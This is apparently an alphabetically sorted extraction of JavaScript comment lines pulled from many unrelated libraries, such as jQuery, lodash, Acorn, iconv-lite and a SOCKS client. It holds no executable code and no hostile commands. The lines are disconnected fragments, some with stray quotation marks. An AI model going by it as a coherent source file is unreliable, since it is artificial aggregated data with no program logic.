// > var x = 2;
// >0xffff code points that are a valid part of identifiers. The
// >1 => >=2.0.0
// >1.2 => >=1.3.0
// >=0.0.0 is equivalent to *
// >=0.0.0 is like a star
// >=1.2.3 is lower than >1.2.3
// >>> makes sure the result is unsigned
// ?
// @TODO Handling all encodings inside a single object makes it very difficult"
// @TODO There should be a utf8-strict encoding that rejects invalid UTF-8 code
// @argument {Array} nodes Array of DOM nodes"
// @argument {Node} nodaA The first node to use in the comparison"
// @argument {Node} nodeB The second node to use in the comparison
// @check why add CRLF? does this account for custom/multiple CRLFs?
// @ignore
// @import rule: fetch the resource and evaluate it.
// @media rule: keep searching inside it.
// @other(safe)
// @other(safe-array-of-prim)
// @other(unsafe)
// @params"
// @prim
// @raises LSException
// @return array
// @return boolean
// @return number
// @return reference or null
// @return string
// @return string (to be compiled)
// @return {Number} A bitmask describing the input nodes' relative position."
// @returns LSInput
// @returns Node
// @returns boolean
// @returns int
// @returns string
// @returns {Array} collection of unique nodes, sorted in document order"
// @see http://dom.spec.whatwg.org/#dom-domimplementation-hasfeature
// @see http://www.quirksmode.org/blog/archives/2008/04/delegating_the.html
// @see http://www.quirksmode.org/dom/events/tests/scroll.html
// @see http://www.quirksmode.org/js/events_properties.html
// @see http://www.w3.org/TR/2004/REC-DOM-Level-3-Core-20040407/core.html#Node3-textContent
// @see http://www.w3.org/TR/html5/index.html#events-0
// @see quirksmode.org/bugreports/archives/2004/11/innerhtml_and_t.html
// @see: http://www.w3.org/TR/DOM-Level-2-Style/css.html#CSS-CSSValue
// @todo Delete current URL in favour of the commented out URL rule when this issue is fixed https://github.com/eslint/eslint/issues/7983.
// @ts-ignore 'isUnaryLike' is declared but its value is never read. [6133]
// @ts-ignore - `@types/node` doesn't allow `null` as file path :/
// @type CSSMediaRule|CSSSupportsRule|CSSKeyframesRule|CSSDocumentRule
// @type CSSStyleSheet|CSSMediaRule|CSSSupportsRule|CSSFontFaceRule|CSSKeyframesRule|CSSDocumentRule
// A
// A /32 block.
// A Buffer instance of data to include in the packet (actual data sent to the remote host)
// A DNS lookup in the real world.
// A Def type can only match an object value.
// A Set object means a directory reservation
// A `-->` line comment
// A bit lenient on corruption
// A bit of a combination of:
// A bit simpler than readable streams.
// A bit too dangerous to mutate `next`.
// A catch clause establishes a new scope but the only variable
// A central reference to the root jQuery(document)
// A class definition is always strict mode code.
// A counter to track how many items to wait for before
// A cross-domain request is in order when the origin doesn't match the current origin.
// A destructive slice always unlocks indentation.
// A driver name should be defined and not overlap with the
// A fn is a direct reservation on that path
// A full walk triggers the callback on each node
// A function following one of those tokens is an expression.
// A global GUID counter for objects
// A good approximation of DOM_DELTA_LINE (1) is 5% of viewport size or
// A linearization of the inheritance hierarchy.
// A linked list is used to store data chunks instead of an array because the
// A linked list to keep track of recently-used-ness
// A list of lexically-declared FunctionDeclaration names in the current lexical scope
// A list of lexically-declared names in the current lexical scope
// A list of offsets in the buffer where we need to insert
// A list of var-declared names in the current lexical scope
// A location step of . is short for self::node().
// A location step of .. is short for parent::node()
// A match means we're done; a fail means we have to keep checking
// A particular type AND object properties:
// A path exclusive reservation system
// A previous serialized cache has the most recent items first
// A query
// A readable tar stream creator
// A recursive descent parser operates by defining functions for all
// A recursive walk is one where your functions override the default
// A second argument must be given to configure the parser process.
// A second optional argument can be given to further configure
// A sequence with explicit chaining.
// A sequence without explicit chaining.
// A simple walk is one where you simply specify callbacks to be
// A simple way to check for HTML strings
// A single base 64 digit can contain 6 bits of data. For the base 64 variable
// A special extend for ajax options
// A strict comparison is necessary because `null == undefined`.
// A switch to disallow the identifier reference 'arguments'
// A temporary value used to identify if the loop should be broken.
// A type is an object with a .check method that takes a value and returns
// A-Z
// A-Z 0-9
// A..F
// A..Z
// A.id=object_id(\'table1\') and A.xtype=B.xtype ORDER BY A.colid
// A0 - A7
// A8 - AF
// ACO
// ACTION_TYPES
// ACV
// AFAICT the content of the symlink file itself is the symlink target filename string
// ALPN is supported by Node.js >= v5.
// AMD
// AMD / RequireJS
// AMD. Register as an anonymous module.
// API
// API action to use
// API config
// API that converts from synchronous-callbacks to imperative style.
// API value normalizes line breaks per WHATWG
// API:
// API][api].
// ASC
// ASO
// ASS
// AST walker module for Mozilla Parser API compatible trees
// ASV
// Abandon the binary search at this level.
// Abort any current/pending executions
// Abort any pending executions
// Abort if not done already and return
// Abort if there are pending holds or we're already ready
// Abort if we hit a combinator
// Aborting is no longer a cancellation
// Above-mentioned will work or use this simple form
// Absorb
// Absorb message into state
// Abstract (non-buildable) comment supertype. Not a Node.
// Abstract supertype of all syntactic entities that are allowed to have a
// Abuses a v8 implementation detail for a very fast case
// Accept quoted arguments as-is
// Accepts only:
// Accessing this property makes selected-by-default
// Account for $.scrollspy(function)
// Acorn is organized as a tokenizer and a recursive-descent parser.
// Acorn uses an [operator precedence parser][opp] to handle binary"
// Acorn was written by Marijn Haverbeke, Ingvar Stepanyan, and"
// Acorn: Loose parser
// ActiveX objects in IE.
// Actual Callbacks object
// Actual callback list
// Actual mapping tables consist of chunks. Use them to fill up decode tables.
// Actually add character.
// Actually create all modifier functions
// Actually launch the test
// Actually launch the tests
// Adapt the sometimes-Async api of tough.CookieJar to our requirements
// Adapted from Chris Veness' SHA1 code at
// Add 0x80 byte
// Add GB18030 decode tables.
// Add IV to config
// Add Setting Button
// Add `Array` methods to `lodash.prototype`.
// Add `LazyWrapper` methods for `_.drop` and `_.take` variants.
// Add `LazyWrapper` methods for `_.head` and `_.last`.
// Add `LazyWrapper` methods for `_.initial` and `_.tail`.
// Add `LazyWrapper` methods that accept an `iteratee` value.
// Add `LazyWrapper` methods to `lodash.prototype`.
// Add a callback or a collection of callbacks to the list
// Add a progress sentinel to prevent the fx queue from being
// Add a stub for each driver API method that delays the call to the
// Add aliases.
// Add all accessor Array functions to the wrapper.
// Add all mutator Array functions to the wrapper.
// Add all of the Underscore functions to the wrapper object.
// Add an extra line break if the previous object property
// Add anti-cache in url if needed
// Add break after content.
// Add button/input type pseudos
// Add chain sequence methods to the `lodash` wrapper.
// Add cloned `this` element(s) after target element
// Add content to the buffer.
// Add decoder for versions of Node not supporting CESU-8
// Add element after `this` element
// Add element before `el` element
// Add elements passing elementMatchers directly to results
// Add flags within a leading mode modifier to the overall pattern's flags
// Add form content
// Add function name to `names` array
// Add help strings.
// Add if stateValue === true or we are toggling and there is no value
// Add in properties whose names you wish to fix before
// Add in style property hooks for overriding the default
// Add in the root
// Add in the static methods
// Add lazy aliases.
// Add level2 features
// Add line break mappings between last known mapping and the end of the
// Add list-specific methods
// Add listeners to Deferred subordinates; treat others as resolved
// Add mappings one character at a time for maximum resolution.
// Add matches to results
// Add methods that return unwrapped values in chain sequences.
// Add methods that return wrapped values in chain sequences.
// Add methods to `Hash`.
// Add methods to `LazyWrapper`.
// Add methods to `ListCache`.
// Add methods to `MapCache`.
// Add methods to `SetCache`.
// Add methods to `Stack`.
// Add methods to `lodash.prototype`.
// Add more encoding pairs when needed.
// Add n-1 at a random position in the array
// Add nodes directly
// Add offsetParent borders
// Add padding
// Add properties assigned by `RegExp#exec`.
// Add protocol if not provided (prefilters might expect it)
// Add the `onopen`, `onerror`, `onclose`, and `onmessage` attributes."
// Add the callback
// Add the driver to localForage.
// Add the first object to the stack of traversed objects.
// Add the footer and return the Buffer object.
// Add the location hash via pushState.
// Add the old object onto the stack (as a reference)
// Add the params to varDeclaredNames to ensure that an error is thrown
// Add the remaining (directly-bound) handlers
// Add the source content to the _sourcesContents map.
// Add the top/left cssHooks using jQuery.fn.position
// Add three new nodes to the beginning of a list of nodes:
// Add which for click: 1 === left; 2 === middle; 3 === right
// Add which for key events
// Add your own custom functions to the Underscore object.
// Added to validation errors of propertyNames keyword schema
// Added when support for blob shims was added
// Adding a string works.
// Adding an array works.
// Adding another source node works.
// Adding other stuff doesn't.
// Additional Public API.
// Additional updates were enqueued by componentDidUpdate handlers or
// Adds an additional builder for Expression subtypes
// Adds easing
// Adds leading zeros if shorter than four characters
// Adjust and apply
// Adjust args if there are dependencies
// Adjust internal read offset if an optional read offset was not provided.
// Adjust tracked smart buffer length
// Adjusts internally managed write offset.
// Advance position by one character
// After a reload indexes are preserved
// After a reload the data has been correctly persisted
// After a reload the indexes are recreated
// After another reload the indexes are still there (i.e. they are preserved during autocompaction)
// After serialization and before deserialization hooks with some basic sanity checks
// After this call all Node basic primitives will understand iconv-lite encodings.
// After:
// Alias UNICODE-1-1-UTF-7
// Alias method option to type as per ticket #12004
// Alias with options. Can be layered.
// Aliased as `all`.
// Aliased as `any`.
// Aliased as `include`.
// Aliased as `methods`
// Aliased as `select`.
// Aliased as `unique`.
// Aliases of generated encodings.
// Align the versions to prevent errors.
// All **ECMAScript 5** native function implementations that we hope to use
// All Rights Reserved.
// All attributes are lowercase
// All clean. Most often case.
// All data correctly persisted on disk
// All direct children of another()
// All direct children of baz()
// All direct children of blah()
// All direct children of catch(e) block
// All direct children of nested()
// All done!
// All equal until one of the nodes. The longer one is the descendant.
// All events should have a target; Cordova deviceready doesn't
// All functions have an implicit 'arguments' object in scope
// All in the name of speed."
// All indexes left unchanged and pointing to the same docs
// All japanese encodings are based on JIS X set of standards:
// All non-basic code points < n have been handled already. Find the next
// All of the above are perceived as null.
// All others
// All planets from the solar system were removed
// All processing will now stop.
// All properties except for `generatedLine` and `generatedColumn` can be"
// All the actual chunk generation logic needs to be
// Allow arbitrary length keys
// Allow custom headers/mimetypes and early abort
// Allow for deprecating things in the process of starting up.
// Allow instantiation without the 'new' keyword
// Allow interspersed arguments (true by default).
// Allow other node type for tolerant parsing.
// Allow special events to draw outside the lines
// Allow the keys array to be GC'ed.
// Allowed chars:"
// Allowed token characters:"
// Allows for debugging when the hook is injected on the page.
// Allows only 0-377(octal) i.e. 0-255(decimal).
// Already tested
// Also disable .add unless we have memory (since it would have no effect)
// Also filter out any prototype objects using the circular check.
// Alter tree structure
// Although parentheses wouldn't hurt around sequence
// Although we could make up a name or generate an anonymous
// Always assume duplicates if they aren't passed to the comparison function
// Always choose a random pivot so that an input array which is reverse
// Always ensure that absolute sources are internally stored relative to
// Always munge function parameters
// Always munge identifiers that were declared within the method function
// Always munge non-computed properties of MemberExpressions
// Always munge private keys on object literals defined within a method's
// Always proxy if NO_PROXY is not set.
// Always return an empty object.
// Always skip document fragments
// Always tell the queue task is complete. Execute callback if any was given.
// Always true
// Always use LineTerminator
// Always using Z_SYNC_FLUSH is what cURL does.
// Always write a new HTML skeleton so Webkit and Firefox don't choke on reuse
// Ampersand -> '&-'
// An `NaN` primitive is the only value that is not equal to itself.
// An abstract (non-buildable) base type that provide a commonly-needed
// An ancestor walk builds up an array of ancestor nodes (including
// An ancestor walk keeps an array of ancestor nodes (including the
// An array of all the key names.
// An array of bytes the size of the pool will be passed to init()
// An empty visitor?
// An error occurred trying to establish this SOCKS connection.
// An example of constructing a new type with arbitrary constraints from
// An expression to strip any whitespace between the gtlt and the thing
// An input loses its value after becoming a radio
// An internal function to generate lookup iterators.
// An interspersed arg
// An update here will schedule an update but immediately set
// Anchor tag for parsing the document origin
// Anchor's host property isn't correctly set when s.url is relative
// And HexDigit HexDigit in https://www.ecma-international.org/ecma-262/8.0/#prod-HexEscapeSequence
// And a skip
// And even helper helper methods!
// And prevent from including source-map by browserify
// And returning `undefined` here would break compatibility with
// And the keywords
// Animate to the value specified
// Animations created synchronously will run synchronously
// Anonymize the function expression.
// Anonymous function.
// Any backreference in replacement strings
// Any character with a later instance in the string
// Any declarations that occur inside the catch body that do
// Any greedy/lazy quantifier
// Any native multicharacter token in character class scope (includes octals)
// Any non-fx value stops us from restoring the original display value
// Any other non-undefined value returned from the visitor method
// Any relative (+/-) values have already been
// Anything else let's inspect with %O
// Appears after one second.
// Append
// Append all elements in toAppend to array
// Append text node to each selected elements
// Append the one or two characters with code points equal to those one or
// Append to fragment
// Appends an alert() call to the output buffer *before* the visited node
// Application is only created once.
// Apply all sorts
// Apply any `formatters` transformations
// Apply config defaults
// Apply converter (if not an equivalence)
// Apply custom fields if provided
// Apply default values.
// Apply modifiers
// Apply postFilter
// Apply prefilters
// Apply projection
// Apply relative offset (+=/-=) if specified
// Apply set filters to unmatched elements
// Apply the dataFilter if provided
// Apply unix properties to request
// Applying limit and skip
// Applying the SourceMap can add and remove items from the sources and
// Approximations of internal ECMAScript conversion functions
// Archaic crash bug won't allow us to use `1 - ( 0.5 || 0 )` (#12497)
// Archive(File)    -a---
// Are we running under Rhino?
// Array Functions
// Array.push() is only available in IE5.5+
// Arrays (first element is most significant and so on)
// Arrays (no match since arrays are used as a $in)
// Arrow function bodies are allowed to be expressions.
// ArrowFunctionExpression). Note that types.visit precomputes a
// As a callback:
// As a side-effect the document's load-event will be dispatched.
// As far as an average Hebrew text with no diacritics is concerned, all four"
// As specified here: http://www.ecma-international.org/ecma-262/6.0/#sec-line-terminators
// As this is a case where the user cannot do anything (they didn't call request directly with this URL)
// As workaround one can calculate file size manually
// Aspirational for now.
// Assemble 16 subkeys
// Assert that there is no fall back to http_proxy
// Assertion
// Asserts that following token is given contextual keyword.
// Assign aliases.
// Assign default placeholders.
// Assign to `_` leaving `_.prototype` unchanged to allow chaining.
// Assign to newCache so results back-propagate to previous elements
// Assigning the kCapture property directly saves an expensive
// Assume cyclic values are equal.
// Assume documents is an array of JSON objects and requestApi is a
// Assume equality for cyclic structures. The algorithm for detecting cyclic
// Assume getBoundingClientRect is there when computed position is fixed
// Assume identity mapping if no targetLoc specified.
// Assume jQuery is ready without the ready module
// Assume that strings that start and end with <> are HTML and skip the regex check
// Assume that we're valid as-of now
// Assumes a single number if not a string
// Astral code point; split in surrogate halves
// Async
// Async with callbacks:
// Async with promises:
// Async/Await
// Async/Await:
// At any time, we're pushing body chunks into the entry at WRITEENTRY,"
// At least give some kind of context to the user
// At least two arguments must be Boolean literals.
// At this point info.socket is a regular net.Socket TCP connection between client and client2 (1.2.3.4) (the client which connected to the proxy on the newly bound port.)
// At this point we know the public suffix is listed.
// At-rule
// Attach Socket error handlers.
// Attach a bunch of functions for handling common AJAX events
// Attach a single capturing handler on the document while someone wants focusin/focusout
// Attach comments
// Attach deferreds
// Attach named capture properties
// Attempt to get data from the cache
// Attempt to read more data if we should.
// Attempt to serialize it
// Attempts to complete a multi-byte UTF-8 character using bytes from a Buffer.
// Attempts to complete a partial non-UTF-8 character using bytes from a Buffer
// Attribute selectors: http://www.w3.org/TR/selectors/#attribute-selectors
// Attributes that are booleans
// Augment
// Augment WordArray.init to handle typed arrays
// Auth must happen last in case signing is dependent on other headers
// Auto managed offset
// Auto managed offset   <Buffer 68 65 6c 6c 6f 00>
// Avoid `split(regex)` for IE8 compatibility. See #17.
// Avoid an infinite loop by temporarily removing this function from the getter
// Avoid comment-prolog char sequence (#10098); must appease lint and evade compression
// Avoid costly calculations while the window size is in flux.
// Avoid excessively updating the position while scrolling.
// Avoid hanging onto element (issue #299)
// Avoid running twice; that would reset tokens and could break references to native globals
// Avoid the error which is emitted from 'socket hang up' to cause the fn undefined error on JS runtime.
// Avoid throwing errors for invalid selectors.
// Avoid trying to start too many processing operations. This can occur
// Await/Async (uses a Promise)
// B.cleanup
// B0 - B7
// B8 - BF
// BAD: this pipes garbage to the stream and fails in unexpected ways
// BIG5
// BIND_LEXICAL.
// BMP code point
// BMP codepoint
// BUGGY_GEBTN return comment nodes (ex: IE)
// BUGGY_XXXXX true if method is feature tested and has known bugs
// Babel 6
// Babel block comment.
// Babel extension.
// Babel line comment.
// Babylon 6 differs in AST from Flow
// Back Compat <1.8 extension point
// Backpedal if it does not belong in this list.
// Backreference
// Backreferences in result array
// Backslash (U+005C) starts an escaped character.
// Backslash (char #92) starts an escaped character.
// Backwards compatibility for request.debug
// Backwards-compat with node 0.10.x
// Backwards-compatible blob type serialization strategy.
// Backwards-compatible prefix for the blob type.
// Balancing already-balanced insertions
// Balancing insertions on the left
// Balancing insertions on the right
// Barrett modular reduction
// Base inspection function for prefilters and transports
// Base types
// Base64 ended.
// Based off https://github.com/ForbesLindesay/umd/blob/master/template.js
// Based on John Resig's `tmpl` implementation
// Baseline setup
// Bash completion-related exports
// Basic JavaScript BN library - subset useful for RSA encryption.
// Basic Javascript Elliptic Curve implementation
// Basic char
// Basic matching is possible
// Basic types:
// Basic usage
// Basic usage: Adds \a for ALERT character
// Basic usage; matches numbers within <b> tags
// Basic use
// Be a good stream and emit end when the response is finished.
// Because `do 42 while (cond)` is Syntax Error. We need semicolon.
// Because advance() (called by lex() called by expect()) expects
// Because advance() (called by lex() called by expect()) expects there
// Because we are modifying the entries (by converting string sources and
// Because we will never consider this node or any nodes
// Because we will never consider this node or any nodes after
// Before Symbol spec.
// Before we can validate we need to take care of IDNs with unicode chars.
// Before:
// Below options specified as default values.
// Big ugly regular expressions that match characters in the
// Big5 frequency table
// Big5 has many variations and is an extension of cp950. We use Encoding Standard's as a consensus.
// BigInteger interfaces not implemented in jsbn:
// Binary data needs binary storage
// Binary number in ES6 starts with '0b'.
// Binary search for GB18030. Returns largest i such that table[i] <= val.
// Bind all of an object's methods to that object. Useful for ensuring that
// Bind response
// Bind script tag hack transport
// Bind the function only if `this` value is used
// Bind the function since bound functions do not have a prototype property.
// BindingRestElement only allows BindingIdentifier
// Bit & byte length
// Bits per digit
// Bits to bytes
// Black-hole SVG <use> instance trees (#13180)
// Black-list of terms with double-negative meaning.
// Blackslash (U+005C) marks Unicode escape sequence.
// Blackslash (char #92) marks Unicode escape sequence.
// Blink bug: https://code.google.com/p/chromium/issues/detail?id=229280
// Blobs are not supported in all versions of IndexedDB, notably"
// Block comment ends with '*/'.
// Boolean attributes get special treatment (#10870)
// Boolean envvar handling:
// Boolean functions
// Boolean indicating whether this line can be reindented.
// Boolean properties
// Booleans
// Both ""ISO"" charsets use a completely identical set of code points, whereas"
// Both are experimental and not in the specification yet.
// Both are not empty. Warning: Never call x.concat(y) when you are not
// Both model probers say it's not them. No reason to continue.
// Both result in an extra syscall when you guess wrong.  However, there"
// Bound with placeholders.
// Bounding box calculation (need to minimize displayed area so that
// Break while
// Broadcast to all.
// Broadcast to everyone else.
// Browser builds
// Browser globals
// Browser window
// Browsers encode the checkmark as &#10003; when submitting as iso-8859-1:
// Browsers.
// Buffer in node 4.x < 4.5.0 doesn't have working Buffer.from
// Buffer#write) will replace incomplete surrogates with the unicode
// Buffers
// Bug 571617: eliminate constant-folding
// Bug 591437: rebound args have their defs turned into uses
// Bug 632026: constant-folding
// Bug 632056: constant-folding
// Build QSA regex
// Build a new jQuery matched element set
// Build handshake packet
// Build the signingString
// Building a settings object
// Builds headers hashtable if needed
// Built-in properties that belong on the element
// Built-in protocols
// Bulk operations run against the entire set
// But I don't have time for a cleaner implementation now
// But allow more writes to happen in this tick.
// But aren't Expressions already Nodes? TODO Report this.
// But aren't Expressions and Patterns already Nodes? TODO Report this.
// But eat eager.
// But it is not necessary to discriminate between the two since
// But maintain support for old signatures
// But the URL should still be valid.
// But there is no chance to pop the context if the keyword is consumed as an identifier such as a property name.
// But you can use these new explicit APIs to make clear what you want:
// By default EventEmitters will print a warning if more than
// By default EventEmitters will print a warning if more than 10 listeners are
// By default we always support no auth.
// By modifying the callback parameter the
// By providing a file name as second argument you enable breakpoints
// Byte encodings are:
// Bytes to bits
// C
// C0 - C7
// C8 - CF
// CAUTION: It's deferred to ES7.
// CDATA section
// CDUP is optional
// CESU-8 decoder is not implemented in Node v4.0+
// CESU-8 encoder is also special.
// CESU-8 represents each of Surrogate Pair by 3-bytes
// CESU-8: lead surrogate (D800-DBFF) is also the incomplete character
// CORS
// CR = part boundary
// CSS escapes http://www.w3.org/TR/CSS21/syndata.html#escaped-characters
// CSS quoted string values
// CSS3 UI element states
// CSS3 dynamic pseudo-classes
// CSS3 lang pseudo-class
// CSS3 negation pseudo-class
// CSS3 target pseudo-class
// CSS3 user action pseudo-classes IE & FF3 have native support
// CSS3: syntax scanner and
// CSS4 :matches 
// CSS4 matches pseudo-class
// Cache `Function` properties
// Cache response headers
// Cache the compiled function
// Cache the index of each encountered element
// Cache the length
// Cache the length.
// Cache the resolver
// Cache the tokens
// Caches the header
// Calculate bytelength of string.
// Calculate high and low result of squaring
// Calculate new counter values
// Calculate new state values
// Calculate pageX/Y if missing and clientX/Y available
// Calculate position if both inputs belong to the same document
// Calculate the `url` parameter
// Calculate the g-values
// Calculate the mask's length.
// Call $(...).scrollagent() with a callback function.
// Call Buffer.readXXXX();
// Call `cb(err)` when you are done with this chunk.  If you pass"
// Call `push(newChunk)` to pass along transformed output"
// Call a native DOM method on the target with the same name name as the event.
// Call all callbacks with the given context and arguments
// Call all the callbacks with the given arguments
// Call buffer.writeXXXX();
// Call given func if any
// Call if it was a function and we have a response
// Call lookahead2() with inJSXChild = false because </ should not be considered in the child
// Call lookahead2() with inXJSChild = false because </ should not be considered in the child
// Call the o related callback with the given arguments.
// Call the postDispatch hook for the mapped type
// Call this function to define a new method to be shared by all AST
// Callback
// Callback for when everything is done
// Callback is optional
// Callback version:
// Callbacks
// Callbacks context
// Called after the response is received
// Called at the start of the parse and after every token. Skips
// Called on each scroll
// Called once
// Called only from within defaultDisplay
// Called when element is stuck to viewport
// Called when element is unstuck from viewport
// Called when element reaches bottom of context
// Called when element reaches top of context
// Called when position is recalculated
// Called with the same arguments as .visit.
// Caller can pass in an object of custom data in lieu of the handler
// Calling Def.prototype.build multiple times has the effect of merely
// Calling the .build method of a Def simultaneously marks the type as
// Calling the end function will send the request
// Calling this.checkAllFields for any other type of node is both
// Camel-case
// Can be adjusted by the user
// Can this be made to work?
// Can't auto-inherit these since the XRegExp constructor returns a nonprimitive value
// Can't rely on Object.keys throwing on non objects since ES6{
// Can't trust NodeList.length
// Can't use both modes at once if not _id
// Cancel the request
// Cancel the trailing debounced invocation.
// Cancel the trailing throttled invocation.
// Cannot be done inside the enqueued callback; the documentElement etc. need to be immediately available.
// Cannot be included sooner due to the mutual dependency between parse.js and CSSStyleDeclaration.js
// Cannot be included sooner due to the mutual dependency between parse.js and CSSStyleSheet.js
// Canonicalize encoding name: strip all non-alphanumeric chars and appended year.
// Canvas context properties
// Caps is short for captures
// Capture F5 to reload the base page testPersistence.html not this one
// Capture backticks as-is from the final query string built above.
// Capture executables
// Capturing group
// Caret ranges.
// Carry bit
// Case 1.
// Cases 2 and 3.
// Cast `value` to a string to ensure the value is set correctly. While
// Cast descendant combinators to space
// Cast to a string so we can do equality checks.
// Cast to undefined so the value passed to
// Catch cases where $(document).ready() is called
// Catch the very common case first: immediately a semicolon (char #59).
// Caution; `option.selected` is not updated if `select.multiple` is
// Certain characters need to be escaped so that they can be put into a
// Certain elements can have dimension info if we invisibly show them
// Ch
// Chain its promise to the database readiness.
// Chainable
// Change the `arguments[0]` string primitive to a `String` object that can store properties
// Change the docs in memory
// Char is one of surrogates.
// Char to FreqOrder table , from hz6763"
// Character Mapping Table:
// Character sequence (our own encoding used)
// Characters emitted in case of error.
// Check BOM.
// Check SOCKS proxy to use
// Check SOCKs command option.
// Check SocksCommand for acceptable command.
// Check a avlt against a simple key => [data] object
// Check a bst against a simple key => [data] object
// Check again without any location info.
// Check against all ancestor/preceding elements
// Check against closest ancestor/preceding element
// Check against the constraints
// Check destination
// Check each part's length and allowed chars.
// Check encoding
// Check existing_socket (if provided)
// Check for HTTP or HTTPS Proxy in environment Else default to null
// Check for `exports` after `define` in case a build optimizer adds it.
// Check for bounds.
// Check for circular references and return its corresponding clone.
// Check for consistency
// Check for correct `exec` handling of nonparticipating capturing groups
// Check for custom tokens at the current position
// Check for encoding
// Check for encoding (third param)
// Check for flag y support (Firefox 3+)
// Check for headers option
// Check for initial Buffer
// Check for invalid encoding.
// Check for invalid offset values.
// Check for listener leak
// Check for most common single-character punctuators.
// Check for native tokens (except character classes) at the current position
// Check for non finite/non integers
// Check for offset
// Check for style in case a browser which returns unreliable values
// Check for task list items
// Check for two different Boolean literals in one call.
// Check for vendor prefixed names
// Check if a given callback is in the list.
// Check if b follows a
// Check if class already exists
// Check if data is available.
// Check if div with explicit width and no margin-right incorrectly
// Check if document is XML
// Check if each node (or one of its ancestors) is already contained in the
// Check if encoding is supported
// Check if getElementById returns elements by name
// Check if it quacks like an element
// Check if module is in cache
// Check if property name clashes with already added.
// Check if the class name is currently defined
// Check if the container itself is a React root node.
// Check if the owner object already has a cache
// Check if the value is an array if we don't force a treatment as value
// Check if typed arrays are supported
// Check if we are using an array-specific comparison function
// Check if we can reuse an existing filesystem entry safely and
// Check if we're dealing with a known content-type
// Check if we're setting a value
// Check if we're writing beyond the bounds of the managed data.
// Check is given string ends with `suffix`."
// Check key and flags
// Check readyState before timeout as it changes
// Check result is valid and return it
// Check state lost if the name is set (#11217)
// Check that `component`'s owner is still alive and that `component` is still the current ref
// Check that cyclic values are equal.
// Check that no index was modified
// Check that only keys in array theRemoved were removed
// Check that the store implements its own removeAllCookies(). The default
// Check that ulimit has been set to the correct value
// Check that value is an object with an inspect function on it
// Check that we didn't get one last unshift.
// Check the algorithm against the official list
// Check the avlt constraint are still met and the data is correct
// Check the bst constraint are still met and the data is correct
// Check the loadDatabase generated an error
// Check timeout
// Check to see if IndexedDB is available and if it is the latest
// Check to see if buffer is a properly encoded OAEP message
// Check to see if it's possible to do matchesSelector
// Check to see if this is actually a grouped type
// Check to see if this is serialized content
// Check to see if this is serialized content we need to
// Check to see if we have a response for the expected dataType
// Check two pieces of data coming from the avlt and data are the same
// Check two pieces of data coming from the bst and data are the same
// Check value
// Check whether `__proto__` is supported
// Check whether `document` exists and only run the frame test if so. This ensures the test is
// Check whether domain belongs to a known public suffix."
// Check whether response has a non-0-sized gzip-encoded body
// Checking for a Stream.Duplex instance is faster here instead of inside
// Checking for several possible values
// Checks at most 3 bytes at the end of a Buffer in order to detect an
// Checks for encoding
// Checks for initial size length
// Checks for valid numberic value;
// Checks if an object has a property.
// Checks the timer has not already been removed
// Cherry-pick methods for smaller browserify/rollup/webpack bundles.
// Chi
// Choose mixing block
// Choose the decoding node where we'll write our chars.
// Choose the first element that is related to our preferred document
// Chown should not fail on einval or eperm if non-root.
// Chrome and IE fire non-standard event when selection is changed (and
// Clamp
// Clamp excess bits
// Clarify!
// Class
// Class DBCSCodec reads and initializes mapping tables.
// Class selector
// Classic
// Clean up if we're done firing for good
// Clean up the event in case it is being reused
// Clean-up function (fires after converters)
// Cleanly remove existing nodes from their previous structures.
// Cleanup code by stripping empty strings.
// Clear all callbacks and values
// Clear buffer
// Clear input after sorting to release objects
// Clear out all listeners. Any in-flight or upcoming events should not get delivered.
// Clear the children first:
// Clear timeout if it exists
// Clear up the last queue stop function
// ClientRequest.OutgoingMessage.setHeader in node 0.12
// Clone each X64Word object
// Clone key for inner and outer pads
// Clone the ordering so it cannot be dynamically mutated.
// Clone to avoid manipulating the comparator's semver object.
// Closing brace
// Code borrowed from PouchDB. See:"
// Code here doesn't run because the promise is rejected!
// Code here never runs because there are rejected promises!
// Codec is not chosen yet. Accumulate initial bytes.
// Codec itself.
// Codec.
// Coerce booleans to `1` or `0` and dates to milliseconds.
// Coerce dates and booleans to numeric primitive values. Dates are compared by their
// Coerce string value into JS value
// Coercion.
// Collect all the original child paths before invoking the callback.
// Collection Functions
// Combinators
// Combine delimiters into one regular expression via alternation.
// Combined Gx and Gy
// Combining several predicates using `_.overEvery` or `_.overSome`.
// Comma and first run
// Command keys insert or clear IME input.
// Command response + incoming connection (bind)
// Comment
// Comment\nerror; }': {
// Comment\nthere; }': {
// Comment\nx; })': {
// CommonJS
// CommonJS require()
// Compaction loop to remove array holes.
// Compare Document Position
// Compare `[[Class]]` names.
// Compare array lengths to determine if a deep comparison is necessary.
// Compare data
// Compare function for sort
// Compare the position of one node against another node in any other document.
// Compensate for old V8 which does not handle invalid flag.
